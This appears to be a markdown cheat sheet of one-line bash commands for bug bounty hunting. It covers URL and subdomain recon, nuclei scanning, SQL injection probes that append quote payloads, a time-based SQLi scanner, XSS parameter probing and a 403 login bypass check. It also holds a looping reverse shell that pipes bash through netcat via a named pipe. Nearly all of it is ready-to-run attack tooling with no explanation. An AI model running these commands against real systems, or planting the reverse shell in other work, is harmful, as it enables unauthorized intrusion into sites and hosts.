## Simple 1Line #BASH For #BugBounty.

```
waybackurls TARGET.COM | grep = | tee urls.txt | nuclei -dast
```

```
gau TARGET.COM | grep = | tee urls.txt | nuclei -dast
```


## 1Line BASH To Perform #SQL_Injection For BugBounties.

```
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable to SQLI Injection\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
```


## LazyEgg - Hunting JS Files.

```
waybackurls target | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg[.]py "{}" --js_urls --domains --ips'
```


## Reverse Shell Bash Loop.

```
while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc 127.0.0.1 9001 >/dev/shm/p; done
```


## Find JavaScript Files.

```
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done
```


## Extract Endpoints from JavaScript.

```
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

## Find Subdomain.

```
subfinder -d target.com -silent | httpx -silent -o urls.txt
```


## SQLi-TimeBased scanner.

```
gau TARGET.COM | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```


## search javascript file.

```
gau -subs TARGET.COM |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```


## 403 login Bypass.

```
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```


## Recon Parameters.

```
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```
